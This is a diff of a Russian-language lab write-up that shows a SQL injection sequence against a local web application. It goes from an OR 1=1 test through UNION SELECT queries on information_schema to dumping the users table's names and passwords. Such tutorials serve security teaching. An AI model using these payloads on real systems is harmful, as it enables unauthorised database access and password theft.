@@ -63,18 +63,21 @@
 9.3. Похищение пароля пользователя
 
 Для начала опробуем классическую конструкцию: OR 1=1 -- . Подставим в URL: 3000’ OR 1 = 1 – 
+
 ![Aspose Words 89a7bdb0-d0e2-4305-a48a-63cdff6a1364 011](https://user-images.githubusercontent.com/87654857/147637413-15d58ef7-6a8b-48c3-bb8c-ab205e9c7c43.png)
 
 
 Далее с помощью UNION - запроса получим названия таблиц и колонок базы данных. Составим запрос такого вида: 
 
 UNION SELECT 0, table\_name, column\_name FROM information\_schema.columns – 
+
 ![Aspose Words 89a7bdb0-d0e2-4305-a48a-63cdff6a1364 012](https://user-images.githubusercontent.com/87654857/147637426-02f1dba4-7f93-4228-8330-9838d21a31f0.png)
 
 
 Теперь получим данные из таблицы book запросом:
 
 ` `UNION SELECT id, name, null FROM book -- 
+
 ![Aspose Words 89a7bdb0-d0e2-4305-a48a-63cdff6a1364 013](https://user-images.githubusercontent.com/87654857/147637440-77cbfebf-fb7e-4338-aeaa-9ec7b32d0da8.png)
 
 
@@ -82,6 +85,7 @@ UNION SELECT 0, table\_name, column\_name FROM information\_schema.columns –
 Чтобы похитить пароль, для начала посмотрим, из чего состоит таблица users аналогичным запросом:
 
 UNION SELECT 0, column\_name, data\_type FROM information\_schema.columns WHERE table\_name = ‘users’ – 
+
 ![Aspose Words 89a7bdb0-d0e2-4305-a48a-63cdff6a1364 014](https://user-images.githubusercontent.com/87654857/147637470-d7ed76e8-4a30-4642-baad-e3eac53ea4e1.png)
 
 
@@ -90,7 +94,8 @@ UNION SELECT 0, column\_name, data\_type FROM information\_schema.columns WHERE 
 
 Чтобы найти пароль, используем запрос:
 
-UNION SELECT 0, name, pass FROM public.users – 
+UNION SELECT 0, name, pass FROM public.users –
+ 
 ![Aspose Words 89a7bdb0-d0e2-4305-a48a-63cdff6a1364 015](https://user-images.githubusercontent.com/87654857/147637486-59c938f1-4fcc-43e7-830a-e76cc86d363c.png)
 ---
 
